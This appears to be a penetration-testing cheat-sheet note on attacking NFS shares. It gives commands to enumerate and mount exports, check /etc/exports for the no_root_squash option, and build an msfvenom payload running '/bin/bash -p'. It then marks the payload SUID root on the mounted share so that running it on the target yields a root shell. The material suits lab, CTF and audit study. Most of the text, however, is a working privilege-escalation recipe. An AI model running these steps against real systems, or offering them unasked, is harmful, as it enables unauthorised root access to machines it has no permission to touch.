# NFS

Show NFS shares:
```bash
$ sudo showmount -e <target>
$ sudo nmap -sV --script=nfs-showmount <target>
```

Mount a share:
```bash
$ mount -o rw,vers=2 <target>:<share> <local_directory>
```
```bash
$ mount -o rw,vers=2 10.0.2.77:bobshare /tmp/nfs/
```

## root squashing

If you create files in mounted share, then the file will have the user/group of the remote user.

This is obviously dangerous if the remote user is `root` with suid 0.

By default remote root users are "squashed" and their created files are owned by nobody/nogroup.

But this might be disabled (or you can disable it). 
The share option that disables this is called `no_root_squash`.


Check the contents of `/etc/exports` for shares with the `no_root_squash` option:
```bash
$ cat /etc/exports
...
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

Here the share called `/tmp` has the `no_root_squash` option enabled.

Switch to your local root user.

Mount the share:
```bash
# mkdir /tmp/nfs
# mount -o rw,vers=2 192.168.1.25:/tmp /tmp/nfs
# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
# chmod +xs /tmp/nfs/shell.elf
```

Then on the target execute the root SUID shell.elf and you will have a root shell.


A great link about this: https://www.errno.fr/nfs_privesc.html

Also includes a local privesc for when a no-root-squash share is limited to localhost.